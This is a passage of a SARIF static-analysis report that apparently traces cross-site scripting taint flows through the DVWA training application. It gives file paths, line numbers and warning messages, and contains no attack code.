                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - mysqli_fetch_row(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:546 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 546
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:546 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 546
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:554 - Assignment to $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 554
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:556 - Return $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 556
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:72 - dvwaguestbook(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:85 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 85
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - mysqli_query(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:540 - Assignment to $result"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 540
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - mysqli_fetch_row(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:544 - Assignment to $row"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 544
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:547 - htmlspecialchars(0 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 547
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:547 - Assignment to $comment"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 547
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:554 - Assignment to $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 554
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:556 - Return $guestbook"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 556
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:72 - dvwaguestbook(return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 72
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:85 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_s/index.php"
                },
                "region" : {
                  "startLine" : 85
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4697",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "DD8DD8938BFFFF08501B32054531C9BE"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:73 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 73
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:94 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/csrf/index.php"
                },
                "region" : {
                  "startLine" : 94
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 32
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:51 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 51
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:65 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/exec/index.php"
                },
                "region" : {
                  "startLine" : 65
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - preg_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "high.php:3 - high.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/high.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - high.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:67 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 67
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/sqli/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        } ]
      } ]
    }, {
      "ruleId" : "4699",
      "message" : {
        "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
      },
      "level" : "warning",
      "partialFingerprints" : {
        "issueInstanceId" : "DF770EB84AD078C6FCA4F29C7145E83B"
      },
      "locations" : [ {
        "physicalLocation" : {
          "artifactLocation" : {
            "uri" : "dvwa/includes/dvwaPage.inc.php"
          },
          "region" : {
            "startLine" : 345,
            "endLine" : 345,
            "startColumn" : 1,
            "endColumn" : 80
          }
        }
      } ],
      "codeFlows" : [ {
        "threadFlows" : [ {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:33 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 33
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:53 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 53
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:66 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/brute/index.php"
                },
                "region" : {
                  "startLine" : 66
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:34 - medium.php(once)({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 34
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:80 - Assignment to $page['body']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 80
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:96 - dvwahtmlecho(0['body'])"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/captcha/index.php"
                },
                "region" : {
                  "startLine" : 96
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          } ]
        }, {
          "locations" : [ {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "dvwaPage.inc.php:345 - builtin_echo(0)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "dvwa/includes/dvwaPage.inc.php"
                },
                "region" : {
                  "startLine" : 345
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Read $_GET['name']"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - str_replace(2 : return)"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:8 - Assignment to $name"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 8
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:11 - Assignment to $html"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 11
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "medium.php:3 - medium.php({$html})"
              },
              "physicalLocation" : {
                "artifactLocation" : {
                  "uri" : "vulnerabilities/xss_r/source/medium.php"
                },
                "region" : {
                  "startLine" : 3
                }
              }
            }
          }, {
            "location" : {
              "message" : {
                "text" : "index.php:32 - medium.php(once)({$html})"
              },
